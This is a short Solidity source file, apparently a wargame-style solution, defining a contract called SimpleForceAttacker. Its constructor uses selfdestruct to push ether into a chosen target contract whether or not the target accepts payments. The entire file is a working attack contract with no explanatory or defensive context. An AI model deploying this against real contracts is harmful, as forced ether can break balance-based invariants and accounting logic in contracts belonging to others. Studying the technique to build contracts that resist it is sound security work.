// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract SimpleForceAttacker { constructor(address payable target) payable { require(msg.value >= 1, 'Need 1 wei or more'); selfdestruct(target); }}